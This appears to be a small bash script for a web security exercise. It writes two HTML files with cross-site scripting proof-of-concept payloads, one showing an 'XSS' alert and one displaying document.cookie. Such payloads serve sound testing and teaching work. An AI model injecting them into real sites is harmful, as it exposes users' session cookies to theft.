#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

cat > "$SCRIPT_DIR/task1_payload.html" <<'EOF'
<script>
alert('XSS');
</script>
EOF

cat > "$SCRIPT_DIR/task2_payload.html" <<'EOF'
<script>
alert(document.cookie);
</script>
EOF

printf 'Criados: task1_payload.html e task2_payload.html\n'
